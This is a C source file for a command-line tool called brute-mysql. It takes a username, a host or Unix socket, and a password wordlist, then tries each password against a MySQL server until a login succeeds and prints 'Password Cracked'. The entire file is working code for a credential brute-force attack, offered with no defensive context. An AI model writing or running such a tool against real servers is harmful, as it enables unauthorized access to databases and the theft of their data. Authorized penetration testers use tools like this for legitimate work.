// gcc brute_mysql.c -o brute-mysql $(mysql_config --libs --cflags)

#include <mysql/mysql.h>
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <stdlib.h>

struct options {
    char *hostname;
    char *user;
    unsigned int port;
    char *unix_socket;
    char *wordlist;
} opts;

int mysql_brute(const char *password){
    int ret = 0;
    MYSQL con;

    mysql_init(&con);

    if(mysql_real_connect(&con, opts.hostname, opts.user, password,
            NULL, opts.port, opts.unix_socket, 0)){
        ret = 1;
    }

    mysql_close(&con);

    return ret;
}

void help(void){
    const char *banner=
        "brute-mysql [OPTIONS] [HOSTNAME]\n\n"
        "Options:\n"
        " -u STRING          Username\n"
        " -p NUMBER          Port number\n"
        " -U FILE            Connect through unix domain socket\n"
        " -w FILE            Password wordlist";

    puts(banner);
    exit(0);
}


int main(int argc, char **argv){
    ssize_t n;
    FILE *fh;
    int opt;

    memset(&opts, 0x0, sizeof(opts));


    while((opt = getopt(argc, argv, "u:U:p:w:")) != -1){
        switch(opt){
            case 'u':
                opts.user = optarg;
                break;
            case 'U':
                opts.unix_socket = optarg;
                break;
            case 'p':
                opts.port = atoi(optarg);
                break;
            case 'w':
                opts.wordlist = optarg;
                break;
            default:
                return 1;
        }
    }

    opts.hostname = argv[optind];

    if(!opts.wordlist || !opts.user ||
        (!opts.hostname && !opts.unix_socket)){
        help();
    }


    fh = fopen(opts.wordlist, "r");
    if(fh == NULL){
        perror("fopen()");
        return 1;
    }

    char *line = NULL;
    size_t len = 0;

    while((n = getline(&line, &len, fh)) > 0){
        // skip blank lines
        if(n == 1 && line[0] == '\n'){
            continue;
        }

        // chomp
        if(line[n-1] == '\n'){
            line[n-1] = 0x0;
        }

        printf("trying: %s\n", line);

        if(mysql_brute(line)){
            printf("\n\n\tPassword Cracked: %s\n\n", line);
            break;
        }
    }

    return 0;
}
